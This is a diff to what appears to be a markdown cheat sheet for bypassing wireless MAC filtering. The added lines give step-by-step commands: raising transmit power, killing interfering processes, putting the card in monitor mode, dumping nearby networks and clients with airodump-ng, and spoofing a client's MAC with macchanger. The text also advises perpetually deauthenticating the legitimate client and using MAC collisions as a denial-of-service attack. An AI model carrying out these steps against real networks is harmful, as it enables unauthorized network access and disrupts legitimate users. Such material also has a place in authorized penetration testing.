@@ -8,22 +8,48 @@ To connect to the same frequency, forcibly disconnect the legitimate client via 
 ### NOTE
 Occasionally, when configuring our MAC address to match that of a client or access point, we may encounter collision events at the data-link layer. This technique of bypassing MAC filtering is most effective when the client we're mimicking is not currently connected to our target network. However, there are instances where these collision events become advantageous to us, serving as a means of denial-of-service (DOS) attack. In the case of a dual-band or multiple access point network, we may be able to utilize a MAC address of a client connected to a separate access point within the same wireless infrastructure.
 
-To see MAC address:
+---
+
+Set router to max power
+```
+sudo ifconfig wlan1 down
+```
+```
+sudo iwconfig wlan1 txpower 30
+```
+```
+sudo ifconfig wlan1 up
+```
+Preemptively kill everything that gets in your way:
+```
+sudo airmon-ng check kill
+```
+See MAC address
 ```
 sudo macchanger wlan1
 ```
-To change MAC address:
+Start monitor mode:
 ```
-sudo ifconfig wlan1 down
+sudo airmon-ng start wlan1
+```
+Save what's there to a file:
+```
+sudo airodump-ng wlan1mon --band agp -w dump
+```
+What is on 2.4? 5? Hidden Networks? What's clients are connected to what APs?
+Change MAC address:
+```
+sudo ifconfig wlan1mon down
 ```
 ```
 sudo macchanger wlan1 -m 3E:48:72:B7:62:2A
 ```
 ```
-sudo ifconfig wlan1 up
+sudo ifconfig wlan1mon up
 ```
+Check changes made:
 ```
-sudo macchanger wlan1
+sudo macchanger wlan1mon
 ```
 OR:
 ```
@@ -33,3 +59,8 @@ Connect to AP via GUI or CLI and verify connection with:
 ```
 ifconfig
 ```
+Remember 2 devices can't connect to the same network with the same MAC address so either:
+- Perpetually deauth legit client to free up space however it's most effective when the client we're mimicking is not currently connected to our target network at all.
+- Connect to the other frequency the device isn't connected to on the network (5 or 2.4)
+
+
